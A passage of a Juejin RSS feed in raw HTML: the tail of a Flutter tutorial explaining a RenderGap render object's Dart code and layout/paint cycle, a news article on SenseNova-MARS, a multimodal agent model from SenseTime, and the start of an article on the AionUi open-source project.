        <span class="hljs-string">'crossAxisExtent=<span class="hljs-subst">${crossAxisExtent ?? <span class="hljs-number">0</span>}</span> '</span>
        <span class="hljs-string">'color=<span class="hljs-subst">$color</span> '</span>
        <span class="hljs-string">'fallbackDirection=<span class="hljs-subst">$fallbackDirection</span>'</span>,
      );
    }
    renderObject
      ..mainAxisExtent = mainAxisExtent
      ..crossAxisExtent = crossAxisExtent ?? <span class="hljs-number">0</span>
      ..color = color
      ..fallbackDirection = fallbackDirection;
  }

  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> debugFillProperties(DiagnosticPropertiesBuilder properties) {
    <span class="hljs-keyword">super</span>.debugFillProperties(properties);
    properties.add(DoubleProperty(<span class="hljs-string">'mainAxisExtent'</span>, mainAxisExtent));
    properties.add(
        DoubleProperty(<span class="hljs-string">'crossAxisExtent'</span>, crossAxisExtent, defaultValue: <span class="hljs-number">0</span>));
    properties.add(ColorProperty(<span class="hljs-string">'color'</span>, color));
    properties.add(EnumProperty&lt;Axis&gt;(<span class="hljs-string">'fallbackDirection'</span>, fallbackDirection));
  }
}
</code></pre>
<h2 data-id="heading-2">RenderGap</h2>
<pre><code class="hljs language-scss" lang="scss">class RenderGap extends RenderBox {
  <span class="hljs-built_in">RenderGap</span>({
    required double mainAxisExtent,
    double? crossAxisExtent,
    Axis? fallbackDirection,
    Color? color,
  })  : _mainAxisExtent = mainAxisExtent,
        _crossAxisExtent = crossAxisExtent,
        _color = color,
        _fallbackDirection = fallbackDirection {
    if (kDebugMode) {
      <span class="hljs-built_in">debugPrint</span>(
        '🆕 RenderGap&lt;init&gt; '
        'mainAxisExtent=$mainAxisExtent '
        'crossAxisExtent=$crossAxisExtent '
        'color=$color '
        'fallbackDirection=$fallbackDirection',
      );
    }
  }

  double get mainAxisExtent =&gt; _mainAxisExtent;
  double _mainAxisExtent;
  set <span class="hljs-built_in">mainAxisExtent</span>(double value) {
    if (_mainAxisExtent != value) {
      if (kDebugMode) {
        <span class="hljs-built_in">debugPrint</span>('📏 mainAxisExtent set: $_mainAxisExtent -&gt; $value');
      }
      _mainAxisExtent = value;
      <span class="hljs-built_in">markNeedsLayout</span>();
    }
  }

  double? get crossAxisExtent =&gt; _crossAxisExtent;
  double? _crossAxisExtent;
  set <span class="hljs-built_in">crossAxisExtent</span>(double? value) {
    if (_crossAxisExtent != value) {
      if (kDebugMode) {
        <span class="hljs-built_in">debugPrint</span>('📐 crossAxisExtent set: $_crossAxisExtent -&gt; $value');
      }
      _crossAxisExtent = value;
      <span class="hljs-built_in">markNeedsLayout</span>();
    }
  }

  Axis? get fallbackDirection =&gt; _fallbackDirection;
  Axis? _fallbackDirection;
  set <span class="hljs-built_in">fallbackDirection</span>(Axis? value) {
    if (_fallbackDirection != value) {
      if (kDebugMode) {
        <span class="hljs-built_in">debugPrint</span>('🧭 fallbackDirection set: $_fallbackDirection -&gt; $value');
      }
      _fallbackDirection = value;
      <span class="hljs-built_in">markNeedsLayout</span>();
    }
  }

  Axis? get _direction {
    final parentNode = parent;
    if (parentNode is RenderFlex) {
      return parentNode<span class="hljs-selector-class">.direction</span>;
    } else {
      return fallbackDirection;
    }
  }

  <span class="hljs-attribute">Color</span>? get <span class="hljs-attribute">color</span> =&gt; _color;
  <span class="hljs-attribute">Color</span>? _color;
  set <span class="hljs-attribute">color</span>(Color? value) {
    if (_color != value) {
      if (kDebugMode) {
        <span class="hljs-built_in">debugPrint</span>('🎨 color set: $_color -&gt; $value');
      }
      _color = value;
      <span class="hljs-built_in">markNeedsPaint</span>();
    }
  }

  <span class="hljs-keyword">@override</span>
  double computeMinIntrinsicWidth(double <span class="hljs-attribute">height</span>) {
    final result = <span class="hljs-built_in">_computeIntrinsicExtent</span>(
      Axis.horizontal,
      () =&gt; super<span class="hljs-selector-class">.computeMinIntrinsicWidth</span>(height),
    )!;
    if (kDebugMode) {
      <span class="hljs-built_in">debugPrint</span>('🔹 computeMinIntrinsicWidth(height=$height) =&gt; <span class="hljs-variable">$result</span>');
    }
    return result;
  }

  <span class="hljs-keyword">@override</span>
  double computeMaxIntrinsicWidth(double <span class="hljs-attribute">height</span>) {
    final result = <span class="hljs-built_in">_computeIntrinsicExtent</span>(
      Axis.horizontal,
      () =&gt; super<span class="hljs-selector-class">.computeMaxIntrinsicWidth</span>(height),
    )!;
    if (kDebugMode) {
      <span class="hljs-built_in">debugPrint</span>('🔷 computeMaxIntrinsicWidth(height=$height) =&gt; <span class="hljs-variable">$result</span>');
    }
    return result;
  }

  <span class="hljs-keyword">@override</span>
  double computeMinIntrinsicHeight(double <span class="hljs-attribute">width</span>) {
    final result = <span class="hljs-built_in">_computeIntrinsicExtent</span>(
      Axis.vertical,
      () =&gt; super<span class="hljs-selector-class">.computeMinIntrinsicHeight</span>(width),
    )!;
    if (kDebugMode) {
      <span class="hljs-built_in">debugPrint</span>('🔸 computeMinIntrinsicHeight(width=$width) =&gt; <span class="hljs-variable">$result</span>');
    }
    return result;
  }

  <span class="hljs-keyword">@override</span>
  double computeMaxIntrinsicHeight(double <span class="hljs-attribute">width</span>) {
    final result = <span class="hljs-built_in">_computeIntrinsicExtent</span>(
      Axis.vertical,
      () =&gt; super<span class="hljs-selector-class">.computeMaxIntrinsicHeight</span>(width),
    )!;
    if (kDebugMode) {
      <span class="hljs-built_in">debugPrint</span>('🔶 computeMaxIntrinsicHeight(width=$width) =&gt; <span class="hljs-variable">$result</span>');
    }
    return result;
  }

  double? <span class="hljs-built_in">_computeIntrinsicExtent</span>(Axis axis, double Function() compute) {
    final Axis? <span class="hljs-attribute">direction</span> = _direction;
    if (direction == axis) {
      final result = _mainAxisExtent;
      if (kDebugMode) {
        <span class="hljs-built_in">debugPrint</span>(
          '📐 _computeIntrinsicExtent(axis=$axis, direction=$direction) =&gt; <span class="hljs-variable">$result</span>',
        );
      }
      return result;
    } else {
      if (_crossAxisExtent!.isFinite) {
        final result = _crossAxisExtent;
        if (kDebugMode) {
          <span class="hljs-built_in">debugPrint</span>(
            '📐 _computeIntrinsicExtent(axis=$axis, direction=$direction) =&gt; <span class="hljs-variable">$result</span>',
          );
        }
        return result;
      } else {
        final result = <span class="hljs-built_in">compute</span>();
        if (kDebugMode) {
          <span class="hljs-built_in">debugPrint</span>(
            '📐 _computeIntrinsicExtent(axis=$axis, direction=$direction) =&gt; <span class="hljs-variable">$result</span>',
          );
        }
        return result;
      }
    }
  }

  <span class="hljs-keyword">@override</span>
  Size computeDryLayout(BoxConstraints constraints) {
    final Axis? <span class="hljs-attribute">direction</span> = _direction;

    if (direction != null) {
      if (direction == Axis.horizontal) {
        final s =
            constraints<span class="hljs-selector-class">.constrain</span>(Size(mainAxisExtent, crossAxisExtent!));
        if (kDebugMode) {
          <span class="hljs-built_in">debugPrint</span>(
            '💧 computeDryLayout(constraints=$constraints, direction=$direction) =&gt; <span class="hljs-variable">$s</span>',
          );
        }
        return s;
      } else {
        final s =
            constraints<span class="hljs-selector-class">.constrain</span>(Size(crossAxisExtent!, mainAxisExtent));
        if (kDebugMode) {
          <span class="hljs-built_in">debugPrint</span>(
            '💧 computeDryLayout(constraints=$constraints, direction=$direction) =&gt; <span class="hljs-variable">$s</span>',
          );
        }
        return s;
      }
    } else {
      throw <span class="hljs-built_in">FlutterError</span>(
        'A Gap widget must be placed directly inside a Flex widget '
        'or its fallbackDirection must not be null',
      );
    }
  }

  <span class="hljs-keyword">@override</span>
  void performLayout() {
    size = <span class="hljs-built_in">computeDryLayout</span>(constraints);
    if (kDebugMode) {
      <span class="hljs-built_in">debugPrint</span>('🛠 performLayout(constraints=$constraints) size=<span class="hljs-variable">$size</span>');
    }
  }

  <span class="hljs-keyword">@override</span>
  void paint(PaintingContext context, Offset offset) {
    if (color != null) {
      final Paint paint = <span class="hljs-built_in">Paint</span>().<span class="hljs-selector-class">.color</span> = <span class="hljs-attribute">color</span>!;
      context<span class="hljs-selector-class">.canvas</span><span class="hljs-selector-class">.drawRect</span>(offset &amp; size, paint);
      if (kDebugMode) {
        <span class="hljs-built_in">debugPrint</span>('🎨 paint(offset=$offset, size=$size, color=$color)');
      }
    } else {
      if (kDebugMode) {
        <span class="hljs-built_in">debugPrint</span>('🎨 paint(offset=$offset, size=$size, color=null)');
      }
    }
  }

  <span class="hljs-keyword">@override</span>
  void debugFillProperties(DiagnosticPropertiesBuilder properties) {
    super<span class="hljs-selector-class">.debugFillProperties</span>(properties);
    if (kDebugMode) {
      <span class="hljs-built_in">debugPrint</span>('🧾 debugFillProperties()');
    }
    properties<span class="hljs-selector-class">.add</span>(DoubleProperty('mainAxisExtent', mainAxisExtent));
    properties<span class="hljs-selector-class">.add</span>(DoubleProperty('crossAxisExtent', crossAxisExtent));
    properties<span class="hljs-selector-class">.add</span>(ColorProperty('color', color));
    properties<span class="hljs-selector-class">.add</span>(EnumProperty&lt;Axis&gt;('fallbackDirection', fallbackDirection));
  }
}
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/61eb8d902caf49c2a2f759635a2f51f5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmljaG9sYXM2OA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770381973&amp;x-signature=KGBT%2B64Io3J2cBKhE36C3%2BXarsg%3D" alt="截屏2026-01-30 19.30.39.png" loading="lazy"/></p>
<p>真正绘制原理, <code>RenderGap</code>是<code>RenderBox</code>的子类, 不需要子类, 绘制时, 只与自身<code>size</code>和<code>color</code>有关。</p>
<p><code>mainAxisExtent</code>、<code>crossAxisExtent</code>属性<code>set</code>方法触发后, 会执行<code>markNeedsLayout</code>, 标记该渲染对象需要重新布局, 并请求(<code>requestVisualUpdate</code>)调度下一帧执行布局。</p>
<p>布局阶段,会执行<code>computeDryLayout</code>、<code>performLayout</code>方法,更新<code>size</code>。</p>
<p>绘制阶段<code>paint</code>,在 offset &amp; size 的矩形内填充颜色（color 为 null 时不绘制）。</p>
<ul>
<li>矩形范围：offset &amp; size 等价于 Rect.fromLTWH(offset.dx, offset.dy, size.width, size.height)，保证绘制严格位于本组件区域。</li>
<li>无子节点与图层：RenderGap 不 push 额外 Layer，也不绘制子内容；仅把一个矩形指令提交到当前画布。</li>
</ul>
<p>跟<code>markNeedsLayout</code>布局阶段不同的是, <code>markNeedsPaint</code>绘制阶段不参与尺寸计算, 它在<code>size</code>确定后才执行。</p>
<p>与标记方法的关系:</p>
<ul>
<li>markNeedsPaint：当 color 变更时由属性 setter 调用，标记本节点需要在下一帧重绘；不会触发布局。</li>
<li>markNeedsLayout：当 mainAxisExtent/crossAxisExtent/fallbackDirection 变更引起尺寸或方向变化时调用；下一帧会重新布局，布局完成后若绘制区域或内容也需更新才会出现 paint。</li>
<li>执行链路示例：属性变更 → 标记（layout/paint）→ 布局（computeDryLayout/performLayout）→ 绘制（paint）。</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[仅凭80亿参数就想挑战GPT-5.2？商汤这个开源“侦探”有点东西]]></title>    <link>https://juejin.cn/post/7600868443832844307</link>    <guid>https://juejin.cn/post/7600868443832844307</guid>    <pubDate>2026-01-30T12:49:24.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600868443832844307" data-draft-id="7600888960106659876" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="仅凭80亿参数就想挑战GPT-5.2？商汤这个开源“侦探”有点东西"/> <meta itemprop="keywords" content="AIGC"/> <meta itemprop="datePublished" content="2026-01-30T12:49:24.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="墨风如雪"/> <meta itemprop="url" content="https://juejin.cn/user/4064249017803927"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            仅凭80亿参数就想挑战GPT-5.2？商汤这个开源“侦探”有点东西
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4064249017803927/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    墨风如雪
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T12:49:24.000Z" title="Fri Jan 30 2026 12:49:24 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>2026年的开年大戏，比我想象中来得更早一些。</p>
<p>就在1月30日，当大家还在讨论GPT-5.2的逻辑推理是否已经触顶时，商汤科技悄无声息地丢出了一枚重磅炸弹：SenseNova-MARS。这不是又一个只会“看图说话”的多模态模型，而是一个能自主思考、会用工具、甚至有点“侦探直觉”的智能体。</p>
<p>最让圈内人咋舌的不是它的技术架构，而是那个刺眼的分数——在多模态搜索与推理的综合平均分上，它拿下了69.74分。</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.worldcodeing.com%2Fwp-content%2Fuploads%2F2026%2F01%2Fasdfsadfs-1024x501.webp" target="_blank" title="https://blog.worldcodeing.com/wp-content/uploads/2026/01/asdfsadfs-1024x501.webp" ref="nofollow noopener noreferrer"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b960e5eb9cb146a796f6c6582f8a72aa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770382164&amp;x-signature=ndsxMFQ%2B%2BTPj8DzUNA%2F3P5nYilA%3D" alt="asdfsadfs" loading="lazy"/></a></p>
<p>这个数字意味着什么？意味着它在纸面实力上，压过了谷歌的Gemini-3-Pro（69.06分），也超过了OpenAI的GPT-5.2（67.64分）。而且，它还是开源的。</p>
<h3 data-id="heading-0">不止是“看”，它学会了“查”</h3>
<p>过去我们玩多模态模型（VLM），流程通常是这样的：你扔给AI一张图，问它“这是哪？”，AI依靠训练时记住的知识库，运气好能蒙对，运气不好就开始一本正经地胡说八道。</p>
<p>SenseNova-MARS的逻辑完全不同。它更像是一个随身携带了放大镜和百科全书的福尔摩斯。</p>
<p>商汤这次主打的概念叫“自主规划”与“多工具协作”。简单来说，当这个模型面对一个复杂问题时，它不再是靠“猜”，而是靠“查”。它能像人类一样，把一个大问题拆解成几个步骤：</p>
<ol>
<li><strong>观察</strong>：看到图里的物体。</li>
<li><strong>规划</strong>：思考需要什么信息才能回答问题。</li>
<li><strong>行动</strong>：调用工具去获取信息（比如切割图片、搜索网络）。</li>
<li><strong>反馈</strong>：根据搜到的结果修正答案。</li>
</ol>
<p>举个很现实的例子：给它一张F1赛车手的照片，问“这个车手所在的车队成立于哪一年？”。</p>
<p>普通模型可能会盯着赛车服上的模糊Logo发呆。但SenseNova-MARS会先调用<strong>图像裁剪工具</strong>，把那个只占画面不到5%的微小Logo切出来放大；识别清楚后，立刻启动<strong>图文搜索</strong>，去网上查这个Logo对应的品牌；确认品牌是某某车队后，再进行二次搜索查询该车队的成立年份。</p>
<p>这套“识别-查询-计算”的连招，就是它得分比GPT-5.2高的秘诀。特别是在HR-MMSearch（高清细节搜索）这项被誉为“AI界奥林匹克”的测试中，它拿到了54.43分，远超那些虽然参数巨大但只会“单次直觉推理”的闭源模型。</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.worldcodeing.com%2Fwp-content%2Fuploads%2F2026%2F01%2Fdsgdfgsfd.webp" target="_blank" title="https://blog.worldcodeing.com/wp-content/uploads/2026/01/dsgdfgsfd.webp" ref="nofollow noopener noreferrer"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6702443365f14382972fb686cd16238c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770382164&amp;x-signature=JAs76pF%2BExXS5VOTpy5IScKUMcw%3D" alt="dsgdfgsfd" loading="lazy"/></a></p>
<h3 data-id="heading-1">怎么练出“直觉”的？</h3>
<p>要把AI训练成这样并不容易。这就好比教一个学生，光让他背书（预训练）是不够的，你得让他去实习，去解决实际问题。</p>
<p>商汤团队这次采用了一种双阶段的训练策略，非常有意思：</p>
<p>第一阶段叫**“打基础”**。他们利用自动化引擎合成了一大堆逻辑严密的高难度案例，像是给AI编了一套《侦探入门指南》，强制它学习基础的工具使用逻辑。</p>
<p>第二阶段叫**“练实战”<strong>。这是拉开差距的关键。他们引入了强化学习，配合一种名为</strong>BN-GSPO**的算法。这就好比把AI扔进模拟实战演练，做对了给奖励，做错了没糖吃。久而久之，模型就培养出了一种“工具使用直觉”。它不再是机械地调用工具，而是知道在什么情况下该搜图，什么情况下该搜字，甚至知道什么时候该停下来思考。</p>
<h3 data-id="heading-2">给开发者的一份大礼</h3>
<p>对于我们在AI圈摸爬滚打的人来说，SenseNova-MARS最吸引人的点在于它的<strong>开源</strong>。</p>
<p>商汤这次非常实在，直接放出了**8B（80亿参数）<strong>和</strong>32B（320亿参数）**两个版本。</p>
<ul>
<li><strong>8B版本</strong>：轻量级，适合显存有限的开发者，甚至有望在高端边缘设备上跑起来。</li>
<li><strong>32B版本</strong>：满血版，那个吊打GPT-5.2的成绩就是它跑出来的，适合需要极致推理能力的科研或商业项目。</li>
</ul>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.worldcodeing.com%2Fwp-content%2Fuploads%2F2026%2F01%2Ffsadfasdf-894x1024.webp" target="_blank" title="https://blog.worldcodeing.com/wp-content/uploads/2026/01/fsadfasdf-894x1024.webp" ref="nofollow noopener noreferrer"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/57c14d760f0d41faacffafd975360c3d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770382164&amp;x-signature=DPOlqPTQs3qigGDLQ0JcTdiwgqI%3D" alt="fsadfasdf" loading="lazy"/></a></p>
<p>这意味着，不管是做商业情报分析（自动从峰会照片里扒竞品信息），还是做复杂的学术图表验证，我们现在都有了一个SOTA（当前最优）级别的开源底座可用。模型权重、训练代码、甚至合成数据集，全都在Hugging Face和GitHub上公开了。</p>
<h3 data-id="heading-3">结语</h3>
<p>SenseNova-MARS的出现，某种程度上标志着多模态AI正在从“感知时代”跨入“行动时代”。</p>
<p>以前我们惊叹于AI能“看懂”一张图，现在我们开始要求AI能“搞定”图里的事。虽然69.74分距离满分还有很长的路要走，但在开源领域，商汤确实把天花板向上狠狠顶了一截。</p>
<p>如果你手头有显卡，不妨去下载那个32B的版本跑跑看。说不定，你电脑里现在就住着一个比GPT-5.2还要精明的“数字侦探”。</p>
<p><strong>如果你也对最新的AI信息感兴趣或者有疑问 都可以加入我的大家庭 第一时间分享最新AI资讯、工具、教程、文档 欢迎你的加入！！！😉😉😉</strong></p>
<p>公众号：墨风如雪小站</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[一天一个开源项目（第7篇）：AionUi - 免费开源的跨平台AI办公助手，Claude Cowork的完美替代]]></title>    <link>https://juejin.cn/post/7601007650722611241</link>    <guid>https://juejin.cn/post/7601007650722611241</guid>    <pubDate>2026-01-30T12:56:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7601007650722611241" data-draft-id="7600863478929883155" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="一天一个开源项目（第7篇）：AionUi - 免费开源的跨平台AI办公助手，Claude Cowork的完美替代"/> <meta itemprop="keywords" content="AIGC,开源,Claude"/> <meta itemprop="datePublished" content="2026-01-30T12:56:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="冬奇Lab"/> <meta itemprop="url" content="https://juejin.cn/user/1857501105781193"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            一天一个开源项目（第7篇）：AionUi - 免费开源的跨平台AI办公助手，Claude Cowork的完美替代
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1857501105781193/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    冬奇Lab
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T12:56:03.000Z" title="Fri Jan 30 2026 12:56:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px 